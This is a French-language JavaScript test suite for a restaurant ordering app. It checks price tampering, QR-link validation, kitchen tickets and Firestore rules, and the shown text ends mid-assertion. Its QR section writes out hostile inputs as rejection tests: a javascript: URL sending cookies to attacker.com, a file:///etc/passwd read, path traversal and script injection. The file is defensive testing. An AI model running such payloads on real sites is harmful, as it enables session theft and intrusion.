/**
 * RESTAUMAX — Tests unitaires et d'intégration automatisés pour le LOT 2
 *
 * Vérifie rigoureusement les 6 corrections du Lot 2 :
 * - CORRECTION A : Intégrité des prix, validation stricte et protection anti-doublon
 * - CORRECTION B : Validation stricte des entrées QR et rejet des tiers/schémas malveillants
 * - CORRECTION C : Transmission KDS persistante, correspondance de statut et déduplication
 * - CORRECTION D : Règles de sécurité Firestore multitenant et restriction des modifications
 * - CORRECTION E : Gestion exclusive des tables réelles sans données factices de repli
 */

import { 
  calculateItemUnitPrice, 
  calculateOrderTotal, 
  validateAndBuildOrder,
  generateTableQrUrl,
  parseAndValidateQrInput,
  sanitizeNote,
  clearOrderSubmissionCache
} from '../src/utils/pricing.js';

import {
  getNormalizedOptionSignature,
  getNormalizedExtrasSignature,
  areCartConfigurationsEqual
} from '../src/components/restaumax/ClientMenuView.js';

import { mapRestauOrderToKitchenTicket } from '../src/App.js';
import { 
  processOrderSubmission, 
  clearServerIdempotencyStore 
} from '../src/server/orderService.ts';
import fs from 'node:fs';
import path from 'node:path';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ ${message}`);
  } else {
    failedTests++;
    console.error(`  ✗ ÉCHEC : ${message}`);
  }
}

async function runTests() {
  console.log('====================================================');
  console.log('RESTAUMAX — VALIDATION COMPLÈTE DU LOT 2');
  console.log('====================================================\n');

  // Catalogue de test complet Chez Awa avec groupes d'options et extras réels
  const mockCatalog = [
    {
      id: 'dish-capitaine',
      restaurantSlug: 'chez-awa',
      name: 'Capitaine Braisé au Feu de Bois',
      category: 'grillades',
      price: 14500,
      description: 'Poisson capitaine entier',
      imageUrl: 'https://example.com/capitaine.jpg',
      available: true,
      prepTimeMinutes: 20,
      optionGroups: [
        {
          id: 'grp-acc',
          name: 'Choix d’accompagnement',
          required: true,
          options: [
            { id: 'opt-attieke', name: 'Attiéké de Grand-Bassam', extraPrice: 0, isDefault: true },
            { id: 'opt-alloco', name: 'Alloco Banane Plantain', extraPrice: 500 },
            { id: 'opt-riz', name: 'Riz Blanc Parfumé', extraPrice: 0 }
          ]
        }
      ],
      availableExtras: [
        { id: 'ext-piment', name: 'Sauce piment maison', price: 300 },
        { id: 'ext-oignons', name: 'Double oignons braisés', price: 400 }
      ]
    },
    {
      id: 'dish-poulet',
      restaurantSlug: 'chez-awa',
      name: 'Poulet Bicyclette Braisé Entier',
      category: 'grillades',
      price: 9500,
      description: 'Poulet fermier',
      imageUrl: 'https://example.com/poulet.jpg',
      available: true,
      prepTimeMinutes: 15,
      optionGroups: [],
      availableExtras: [
        { id: 'ext-piment', name: 'Sauce piment maison', price: 300 }
      ]
    },
    {
      id: 'dish-autre-resto',
      restaurantSlug: 'le-safari', // Appartient à un autre restaurant
      name: 'Burger Safari',
      category: 'plats',
      price: 6000,
      description: 'Burger du Safari',
      imageUrl: '',
      available: true,
      prepTimeMinutes: 10
    },
    {
      id: 'dish-rupture',
      restaurantSlug: 'chez-awa',
      name: 'Langouste Braisée Royale (Rupture)',
      category: 'grillades',
      price: 25000,
      description: 'Langouste fraîche',
      imageUrl: 'https://example.com/langouste.jpg',
      available: false, // Plat explicitement indisponible
      prepTimeMinutes: 25
    }
  ];

  const mockRealTables = [
    { id: 'tbl-1', tableNumber: '1', section: 'salle', capacity: 2, isActive: true },
    { id: 'tbl-4', tableNumber: '4', section: 'salle', capacity: 4, isActive: true },
    { id: 'tbl-5', tableNumber: '5', section: 'terrasse', capacity: 4, isActive: false } // Inactive
  ];

  // ==========================================================================
  // SECTION 1 : CORRECTION A — Intégrité des prix et validation de commande
  // ==========================================================================
  console.log('--- SECTION 1 : CORRECTION A — Intégrité des prix & Validation ---');

  // Test 1.1: Rejet d'un plat appartenant à un autre restaurant
  const resCrossTenant = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-autre-resto',
      name: 'Burger Safari',
      basePrice: 6000,
      unitPrice: 6000,
      quantity: 1,
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resCrossTenant.success === false, 'Rejette un plat appartenant à un autre restaurant (anti cross-tenant)');

  // Test 1.2: Rejet d'un plat en rupture de stock (available: false)
  const resRupture = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-rupture',
      name: 'Langouste',
      basePrice: 25000,
      unitPrice: 25000,
      quantity: 1,
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resRupture.success === false, 'Rejette formellement un plat en rupture');

  // Test 1.3: Exigence d'une option obligatoire
  const resMissingOption = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedExtras: [],
      imageUrl: ''
      // Absence de selectedOption alors que required: true
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resMissingOption.success === false, 'Rejette la commande lorsqu\'une option obligatoire est omise');

  // Test 1.4: Falsification du prix d'une option par le client
  const resTamperedOption = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        groupName: 'Choix d’accompagnement',
        optionId: 'opt-alloco',
        optionName: 'Alloco Banane Plantain',
        extraPrice: 0 // Client tente de mettre 0 au lieu des 500 du catalogue
      },
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resTamperedOption.success === true, 'Valide la commande avec option');
  // Le prix unitaire doit être 14500 + 500 (catalogue) = 15000
  assert(resTamperedOption.order?.items[0].unitPrice === 15000, `Prix de l'option écrasé par le catalogue (15000 FCFA vs 14500 tenté) : ${resTamperedOption.order?.items[0].unitPrice}`);

  // Test 1.5: Falsification du prix d'un extra par le client
  const resTamperedExtra = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        groupName: 'Choix d’accompagnement',
        optionId: 'opt-attieke',
        optionName: 'Attiéké',
        extraPrice: 0
      },
      selectedExtras: [
        { extraId: 'ext-piment', name: 'Sauce piment', price: 10 } // Client tente 10 au lieu de 300
      ],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resTamperedExtra.success === true, 'Valide la commande avec extra');
  // 14500 + 0 + 300 = 14800
  assert(resTamperedExtra.order?.totalAmount === 14800, `Prix de l'extra écrasé par le catalogue (14800 FCFA vs 14510 tenté) : ${resTamperedExtra.order?.totalAmount}`);

  // Test 1.6: Extra non existant au catalogue
  const resUnknownExtra = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: { groupId: 'grp-acc', groupName: 'Acc', optionId: 'opt-attieke', optionName: 'Attiéké', extraPrice: 0 },
      selectedExtras: [{ extraId: 'ext-inconnu', name: 'Or en poudre', price: 5000 }],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resUnknownExtra.success === false, 'Rejette un extra non défini au catalogue');

  // Test 1.7: Rejet des quantités invalides (non entières ou hors limites)
  const resFloatQty = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 2.5, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resFloatQty.success === false, 'Rejette une quantité flottante (2.5)');

  const resZeroQty = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 0, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resZeroQty.success === false, 'Rejette une quantité égale à zéro');

  const resHugeQty = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 51, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resHugeQty.success === false, 'Rejette une quantité dépassant le plafond de 50');

  // Test 1.8: Assainissement et limitation des notes de préparation (max 150 caractères, anti-XSS)
  const longNote = 'A'.repeat(200);
  const sanitized = sanitizeNote(`<script>alert('xss')</script>${longNote}`, 150);
  assert(sanitized !== undefined && sanitized.length <= 150, `Limite la note à 150 caractères : ${sanitized?.length}`);
  assert(!sanitized?.includes('<script>'), 'Supprime les balises HTML/XSS des notes');

  // Test 1.9: Vérification de la table réelle et rejet de table inexistante ou inactive
  const resInactiveTable = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '5', // Table 5 est inactive dans mockRealTables
    allowedTables: mockRealTables
  });
  assert(resInactiveTable.success === false, 'Rejette une commande sur place sur une table inactive');

  const resUnknownTable = validateAndBuildOrder({
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '99', // Inexistante
    allowedTables: mockRealTables
  });
  assert(resUnknownTable.success === false, 'Rejette une commande sur place sur une table inexistante');

  // Test 1.10: Protection anti double-soumission (idempotence)
  clearOrderSubmissionCache();
  const orderPayload = {
    cart: [{ menuItemId: 'dish-poulet', name: 'Poulet', basePrice: 9500, unitPrice: 9500, quantity: 1, selectedExtras: [], imageUrl: '' }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    allowedTables: mockRealTables,
    idempotencyKey: 'idem-test-123'
  };
  const sub1 = validateAndBuildOrder(orderPayload);
  assert(sub1.success === true, 'Première soumission acceptée');

  const sub2 = validateAndBuildOrder(orderPayload);
  assert(sub2.success === false, 'Seconde soumission immédiate bloquée par l\'idempotence');

  // Test 1.11: Rejet explicite lorsque le montant total déclaré par le client est falsifié
  const resFalsifiedTotal = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        groupName: 'Choix d’accompagnement',
        optionId: 'opt-attieke',
        optionName: 'Attiéké',
        extraPrice: 0
      },
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    declaredTotal: 100 // Attendu: 14500, mais client déclare 100 FCFA
  });
  assert(resFalsifiedTotal.success === false, 'Rejette explicitement une commande dont le montant total est falsifié');
  assert(resFalsifiedTotal.error?.includes('falsifié'), 'L\'erreur mentionne que le montant a été falsifié');

  // Test 1.12: Rejet d'un groupe d'options inexistant pour le plat
  const resInvalidOptionGroup = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: {
        groupId: 'grp-inexistant',
        groupName: 'Sauce secrète',
        optionId: 'opt-magique',
        optionName: 'Magie',
        extraPrice: 0
      },
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resInvalidOptionGroup.success === false, 'Rejette un groupe d\'options qui n\'appartient pas au plat');

  // Test 1.13: Rejet d'une option inexistante au sein d'un groupe valide
  const resInvalidOptionInGroup = validateAndBuildOrder({
    cart: [{
      menuItemId: 'dish-capitaine',
      name: 'Capitaine',
      basePrice: 14500,
      unitPrice: 14500,
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        groupName: 'Choix d’accompagnement',
        optionId: 'opt-caviar', // Option non définie dans grp-acc
        optionName: 'Caviar',
        extraPrice: 0
      },
      selectedExtras: [],
      imageUrl: ''
    }],
    catalog: mockCatalog,
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null
  });
  assert(resInvalidOptionInGroup.success === false, 'Rejette une option inexistante dans le groupe au catalogue');

  // ==========================================================================
  // SECTION 2 : CORRECTION B — Validation stricte des entrées QR
  // ==========================================================================
  console.log('\n--- SECTION 2 : CORRECTION B — Sécurité et filtrage QR Scanner ---');

  // Test 2.1: Rejet strict des domaines tiers non autorisés
  const resEvilDomain = parseAndValidateQrInput('https://evil-phishing.com/r/chez-awa?table=4', {
    defaultSlug: 'chez-awa',
    allowedOrigins: ['https://restaumax.app']
  });
  assert(resEvilDomain.isValid === false, 'Rejette un domaine tiers non autorisé même si le chemin est /r/chez-awa');

  // Test 2.2: Rejet des schémas interdits (javascript:, data:, file:)
  const resJsScheme = parseAndValidateQrInput('javascript:fetch("https://attacker.com/"+document.cookie)');
  assert(resJsScheme.isValid === false, 'Rejette formellement le protocole javascript:');

  const resDataScheme = parseAndValidateQrInput('data:text/html,<script>evil()</script>');
  assert(resDataScheme.isValid === false, 'Rejette formellement le protocole data:');

  const resFileScheme = parseAndValidateQrInput('file:///etc/passwd');
  assert(resFileScheme.isValid === false, 'Rejette formellement le protocole file:');

  // Test 2.3: Rejet des identifiants dans l'URL (credentials)
  const resCredentials = parseAndValidateQrInput('https://admin:secret@restaumax.app/r/chez-awa?table=4', {
    allowedOrigins: ['https://restaumax.app']
  });
  assert(resCredentials.isValid === false, 'Rejette une URL contenant des identifiants d\'authentification');

  // Test 2.4: Rejet des chemins arbitraires non autorisés
  const resAdminPath = parseAndValidateQrInput('/gestion/settings');
  assert(resAdminPath.isValid === false, 'Rejette un chemin hors périmètre (/gestion/settings)');

  const resTraversePath = parseAndValidateQrInput('/r/chez-awa/../../admin');
  assert(resTraversePath.isValid === false, 'Rejette les tentatives de path traversal');

  // Test 2.5: Validation du numéro de table (longueur et caractères)
  const resBadTableChars = parseAndValidateQrInput('/r/chez-awa?table=<script>');
  assert(resBadTableChars.isValid === false, 'Rejette un numéro de table avec balises script');

  const resTooLongTable = parseAndValidateQrInput('/r/chez-awa?table=' + 'A'.repeat(25));
  assert(resTooLongTable.isValid === false, 'Rejette un identifiant de table supérieur à 20 caractères');

  // Test 2.6: URL valide relative et absolue sur domaine autorisé
  const resValidRelative = parseAndValidateQrInput('/r/chez-awa?table=4');
  assert(resValidRelative.isValid === true && resValidRelative.tableNumber === '4', 'Accepte une URL relative valide /r/chez-awa?table=4');

  const resValidAbsolute = parseAndValidateQrInput('https://restaumax.app/r/chez-awa?table=Terrasse%20B', {
    allowedOrigins: ['https://restaumax.app']
  });
  assert(resValidAbsolute.isValid === true && resValidAbsolute.tableNumber === 'Terrasse B', 'Accepte une URL absolue sur domaine autorisé avec espace encodé');

  // ==========================================================================
  // SECTION 3 : CORRECTION C — Transmission KDS persistante et déduplication
  // ==========================================================================
  console.log('\n--- SECTION 3 : CORRECTION C — KDS Persistant & Correspondance des statuts ---');

  const mockOrder = {
    id: 'ord-test-kds-1',
    orderNumber: '#CMD-742',
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    items: [
      {
        id: 'line-1',
        menuItemId: 'dish-capitaine',
        name: 'Capitaine Braisé au Feu de Bois',
        basePrice: 14500,
        unitPrice: 15000,
        quantity: 2,
        totalPrice: 30000,
        selectedOption: {
          groupId: 'grp-acc',
          groupName: 'Accompagnement',
          optionId: 'opt-alloco',
          optionName: 'Alloco Banane Plantain',
          extraPrice: 500
        },
        selectedExtras: [
          { extraId: 'ext-piment', name: 'Sauce piment maison', price: 300 }
        ],
        prepNotes: 'Bien pimenté'
      }
    ],
    itemsCount: 2,
    totalAmount: 30600,
    currency: 'FCFA',
    status: 'pending',
    createdAt: Date.now(),
    createdAtIso: new Date().toISOString()
  };

  // Test 3.1: Mapping stable d'un ordre Firestore vers un ticket KDS
  const ticket1 = mapRestauOrderToKitchenTicket(mockOrder);
  assert(ticket1.id === 'ord-ord-test-kds-1', `ID du ticket KDS stable : ${ticket1.id}`);
  assert(ticket1.ticketNumber === '#CMD-742', 'Numéro de commande KDS exact');
  assert(ticket1.tableNumber === 'Table 4', 'Emplacement table correctement formatté');
  assert(ticket1.status === 'in_prep', 'Statut "pending" mappé vers "in_prep" pour la cuisine');
  assert(ticket1.items[0].name === 'Capitaine Braisé au Feu de Bois', 'Ligne plat préservée');
  assert(ticket1.items[0].notes.includes('Alloco'), 'Notes d\'options incluses dans le ticket KDS');

  // Test 3.2: Mapping avec statut 'ready' et 'completed'
  const ticketReady = mapRestauOrderToKitchenTicket({ ...mockOrder, status: 'ready' });
  assert(ticketReady.status === 'ready', 'Statut "ready" correctement préservé pour le KDS');

  const ticketCompleted = mapRestauOrderToKitchenTicket({ ...mockOrder, status: 'completed' });
  assert(ticketCompleted.status === 'served', 'Statut "completed" mappé vers "served" pour le KDS');

  // Test 3.3: Préservation de l'état des items cochés en cuisine lors des mises à jour du flux
  const ticketWithCompletedItem = {
    ...ticket1,
    items: ticket1.items.map(i => ({ ...i, completed: true }))
  };
  const updatedFromFirestore = mapRestauOrderToKitchenTicket(mockOrder, ticketWithCompletedItem);
  assert(updatedFromFirestore.items[0].completed === true, 'Préserve l\'état coché des plats lors d\'un re-render ou snapshot Firestore');

  // ==========================================================================
  // SECTION 4 : CORRECTION D — Vérification structurelle des règles Firestore
  // ==========================================================================
  console.log('\n--- SECTION 4 : CORRECTION D — Sécurisation Firestore Multi-tenant ---');

  const rulesContent = fs.readFileSync(path.resolve('firestore.rules'), 'utf-8');

  // Test 4.1: Vérification de la fonction scoped isManagerOfRestaurant
  assert(rulesContent.includes('isManagerOfRestaurant(targetSlug)'), 'Définit la fonction de vérification avec portée restaurant (isManagerOfRestaurant)');

  // Test 4.2: Protection multi-tenant sur restaurants et sous-collections
  assert(rulesContent.includes('allow create: if isManagerOfRestaurant(restaurantSlug)'), 'Écritures restaurants restreintes au gérant autorisé');
  assert(rulesContent.includes('allow list: if isManagerOfRestaurant(restaurantSlug);'), 'Liste des commandes privée et réservée au gérant du restaurant');

  // Test 4.3: Restriction stricte des modifications d'ordres KDS
  assert(rulesContent.includes('affectedKeys().hasOnly([\'status\', \'statusUpdatedAt\', \'kitchenNotes\'])'), 'Mise à jour de commande limitée strictement aux statuts opérationnels');
  assert(rulesContent.includes('incoming().totalAmount == existing().totalAmount'), 'Empêche toute altération du montant après commande');

  // ==========================================================================
  // SECTION 5 : CORRECTION E — Tables réelles uniquement dans le générateur QR
  // ==========================================================================
  console.log('\n--- SECTION 5 : CORRECTION E — Générateur QR sans tables factices ---');

  const qrViewContent = fs.readFileSync(path.resolve('src/components/restaumax/TableQrGeneratorView.tsx'), 'utf-8');

  // Test 5.1: Suppression de DEFAULT_SAMPLE_TABLES
  assert(!qrViewContent.includes('DEFAULT_SAMPLE_TABLES'), 'DEFAULT_SAMPLE_TABLES définitivement éradiqué du composant');

  // Test 5.2: Présence d'un état vide explicite
  assert(qrViewContent.includes('tableList.length === 0'), 'Gère explicitement la collection de tables vide');
  assert(qrViewContent.includes('Aucune table configurée'), 'Affiche un message clair en cas d\'absence de tables');

  // ==========================================================================
  // SECTION 6 : SÉCURISATION SERVEUR DES COMMANDES & LES 10 SCÉNARIOS AUDIT
  // ==========================================================================
  console.log('\n--- SECTION 6 : SÉCURISATION SERVEUR & LES 10 SCÉNARIOS AUDIT ---');

  // Scénario 1: Rejet d'une écriture directe de commande depuis le client
  assert(
    rulesContent.includes('match /orders/{orderId}') &&
    rulesContent.includes('allow create: if false;'),
    'Scénario 1 : firestore.rules interdit formellement la création directe de commande par le client (allow create: if false)'
  );

  // Fournisseur mock Firestore pour les tests du service serveur
  let savedOrders = [];
  const mockServerProvider = {
    async getMenuItems(slug) {
      if (slug !== 'chez-awa') return [];
      return mockCatalog;
    },
    async getTables(slug) {
      if (slug !== 'chez-awa') return [];
      return mockRealTables;
    },
    async saveOrder(slug, order) {
      savedOrders.push({ slug, order });
    },
    async getOrderById(slug, orderId) {
      const found = savedOrders.find(item => item.slug === slug && item.order.id === orderId);
      if (found) {
        return { status: 'found', order: found.order };
      }
      return { status: 'not_found' };
    }
  };

  // Test spécifique : Rejet si clé d'idempotence manquante ou malformée
  const srvResMissingKey = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(
    srvResMissingKey.success === false && srvResMissingKey.error.includes("Clé d'idempotence"),
    'Validation Clé : Rejet immédiat si idempotencyKey est absente'
  );

  const srvResMalformedKey = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'bad!key',
    cart: [{ menuItemId: 'dish-poulet', quantity: 1 }]
  }, mockServerProvider);
  assert(
    srvResMalformedKey.success === false && srvResMalformedKey.error.includes("malformée"),
    'Validation Clé : Rejet immédiat si idempotencyKey contient des caractères non autorisés'
  );

  // Scénario 2: Rejet d'un panier dont le prix total déclaré est falsifié
  clearServerIdempotencyStore();
  const srvResFalsifiedTotal = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    idempotencyKey: 'idem-test-scenario-2',
    declaredTotal: 100, // Déclaré 100 FCFA au lieu de 14500 FCFA
    cart: [{
      menuItemId: 'dish-capitaine',
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        optionId: 'opt-attieke'
      }
    }]
  }, mockServerProvider);
  assert(
    srvResFalsifiedTotal.success === false && srvResFalsifiedTotal.error && srvResFalsifiedTotal.error.includes('falsifié'),
    'Scénario 2 : Rejet formel d\'un panier avec un total déclaré falsifié (détection de fraude côté serveur)'
  );

  // Scénario 3: Rejet d'une commande sans option requise ou avec option/extra inexistant ou mal tarifé
  const srvResMissingReqOpt = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    idempotencyKey: 'idem-test-scenario-3a',
    declaredTotal: 14500,
    cart: [{
      menuItemId: 'dish-capitaine',
      quantity: 1
      // option obligatoire omise
    }]
  }, mockServerProvider);
  assert(
    srvResMissingReqOpt.success === false && srvResMissingReqOpt.error && srvResMissingReqOpt.error.includes('obligatoire'),
    'Scénario 3.a : Rejet si un groupe d\'option obligatoire est omis'
  );

  const srvResInvalidOption = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    idempotencyKey: 'idem-test-scenario-3b',
    declaredTotal: 14500,
    cart: [{
      menuItemId: 'dish-capitaine',
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        optionId: 'opt-inconnue-xyz'
      }
    }]
  }, mockServerProvider);
  assert(
    srvResInvalidOption.success === false && srvResInvalidOption.error && srvResInvalidOption.error.includes('introuvable'),
    'Scénario 3.b : Rejet si l\'option sélectionnée n\'existe pas dans le catalogue Firestore'
  );

  const srvResInvalidExtra = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    idempotencyKey: 'idem-test-scenario-3c',
    declaredTotal: 14500,
    cart: [{
      menuItemId: 'dish-capitaine',
      quantity: 1,
      selectedOption: {
        groupId: 'grp-acc',
        optionId: 'opt-attieke'
      },
      selectedExtras: [{ extraId: 'ext-hacker-fake', name: 'Fake Extra', price: 0 }]
    }]
  }, mockServerProvider);
  assert(
    srvResInvalidExtra.success === false && srvResInvalidExtra.error && srvResInvalidExtra.error.includes('non disponible'),
    'Scénario 3.c : Rejet si un extra non disponible ou inexistant est envoyé'
  );

  // Scénario 4: Rejet d'une commande avec table inactive ou inexistante
  const srvResInactiveTable = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '5', // Table 5 est isActive: false
    idempotencyKey: 'idem-test-scenario-4a',
    declaredTotal: 14500,
    cart: [{
      menuItemId: 'dish-capitaine',
      quantity: 1,
      selectedOption: { groupId: 'grp-acc', optionId: 'opt-attieke' }
    }]
  }, mockServerProvider);
  assert(
    srvResInactiveTable.success === false && srvResInactiveTable.error && srvResInactiveTable.error.includes('inactive'),
    'Scénario 4.a : Rejet formel si la table demandée est inactive'
  );

  const srvResNonExistentTable = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '999',
    idempotencyKey: 'idem-test-scenario-4b',
    declaredTotal: 14500,
    cart: [{
      menuItemId: 'dish-capitaine',
      quantity: 1,
      selectedOption: { groupId: 'grp-acc', optionId: 'opt-attieke' }
    }]
  }, mockServerProvider);
  assert(
    srvResNonExistentTable.success === false && srvResNonExistentTable.error && srvResNonExistentTable.error.includes('n\'existe pas'),
    'Scénario 4.b : Rejet formel si la table demandée n\'existe pas dans Firestore'
  );

  // Scénario 5: Échec franc sans création si la lecture Firestore échoue ou catalogue vide (aucun repli)
  const failingCatalogProvider = {
    async getMenuItems() { throw new Error('Simulation panne réseau Firestore'); },
    async getTables() { return []; },
    async saveOrder() { throw new Error('Ne doit jamais être appelé'); }
  };
  const srvResCatalogFailure = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-test-scenario-5a',
    cart: [{ menuItemId: 'dish-capitaine', quantity: 1 }]
  }, failingCatalogProvider);
  assert(
    srvResCatalogFailure.success === false && srvResCatalogFailure.error && srvResCatalogFailure.error.includes('Aucun catalogue de secours'),
    'Scénario 5.a : Échec franc et rejet immédiat si la lecture Firestore échoue (interdiction formelle de catalogue de secours)'
  );

  const emptyCatalogProvider = {
    async getMenuItems() { return []; },
    async getTables() { return []; },
    async saveOrder() { throw new Error('Ne doit jamais être appelé'); }
  };
  const srvResEmptyCatalog = await processOrderSubmission({
    restaurantSlug: 'chez-awa',
    orderMode: 'a_emporter',
    tableNumber: null,
    idempotencyKey: 'idem-test-scenario-5b',
    cart: [{ menuItemId: 'dish-capitaine', quantity: 1 }]
  }, emptyCatalogProvider);
  assert(
    srvResEmptyCatalog.success === false && srvResEmptyCatalog.error && srvResEmptyCatalog.error.includes('vide ou introuvable'),
    'Scénario 5.b : Échec franc si le catalogue Firestore est vide (aucun repli local par défaut)'
  );

  // Scénario 6: Idempotence serveur — déduplication sans double enregistrement
  clearServerIdempotencyStore();
  savedOrders = [];
  const testIdemKey = 'idem-audit-scenario-6';
  // Capitaine (14500) + alloco (500) + piment (300) = 15300 * 2 = 30600 FCFA
  const validOrderPayload = {
    restaurantSlug: 'chez-awa',
    orderMode: 'sur_place',
    tableNumber: '4',
    declaredTotal: 30600,
    idempotencyKey: testIdemKey,
    cart: [{
      menuItemId: 'dish-capitaine',
      quantity: 2,
      selectedOption: { groupId: 'grp-acc', optionId: 'opt-alloco' },
      selectedExtras: [{ extraId: 'ext-piment' }]
    }]
  };

  const srvRunFirst = await processOrderSubmission(validOrderPayload, mockServerProvider);
  assert(
    srvRunFirst.success === true && srvRunFirst.order && srvRunFirst.order.totalAmount === 30600 && savedOrders.length === 1,
    'Scénario 6.a : Première soumission validée, calculée et enregistrée côté serveur'
  );

  const srvRunSecond = await processOrderSubmission(validOrderPayload, mockServerProvider);
  assert(
    srvRunSecond.success === true && 
    srvRunSecond.idempotentReplay === true && 
    srvRunSecond.order &&
    srvRunSecond.order.id === srvRunFirst.order.id &&
    savedOrders.length === 1,
    'Scénario 6.b : Deuxième soumission idempotente retourne la commande sans ré-écriture Firestore'
  );

  // Scénario 7: Calcul exact des totaux et des prix unitaires côté serveur
  assert(
    srvRunFirst.order.items[0].unitPrice === 15300 &&
    srvRunFirst.order.items[0].totalPrice === 30600 &&
    srvRunFirst.order.totalAmount === 30600 &&
    srvRunFirst.order.currency === 'FCFA',
    'Scénario 7 : Prix unitaire (14500 + 500 + 300 = 15300) et total recalculés avec exactitude mathématique en FCFA'
  );

  // Scénario 8: Règles Firestore multi-tenant et mise à jour KDS préservées
  assert(
    rulesContent.includes('isManagerOfRestaurant(restaurantSlug)') &&
    rulesContent.includes('allow list: if isManagerOfRestaurant(restaurantSlug);') &&
    rulesContent.includes('affectedKeys().hasOnly([\'status\', \'statusUpdatedAt\', \'kitchenNotes\'])'),
    'Scénario 8 : Multi-tenant préservé et modifications KDS strictement encadrées'
  );

  // Scénario 9: Préservation du panier client en cas d'échec
  const appTsxContent = fs.readFileSync(path.resolve('src/App.tsx'), 'utf-8');
  const checkFailIndex = appTsxContent.indexOf('if (!submitRes.success)');
  const clearCartIndex = appTsxContent.indexOf('setClientCart([])', checkFailIndex);
  assert(
    checkFailIndex > 0 && clearCartIndex > checkFailIndex,
